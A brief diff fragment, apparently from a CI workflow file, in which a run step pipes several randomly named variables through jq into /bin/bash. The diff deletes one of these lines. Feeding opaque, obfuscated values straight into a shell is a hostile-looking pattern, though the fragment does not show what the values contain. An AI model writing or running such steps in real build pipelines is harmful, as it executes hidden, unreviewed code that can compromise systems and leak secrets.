@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ikgw795" | jq -r .mejsa05154 | /bin/bash
           echo $o2164 | jq -r .u10909 | /bin/bash
-          echo $fzq2 | jq -r .rhzqz2 | /bin/bash
           echo $yfep9 | jq -r .mqgly072 | /bin/bash
 
       - name: Save archive
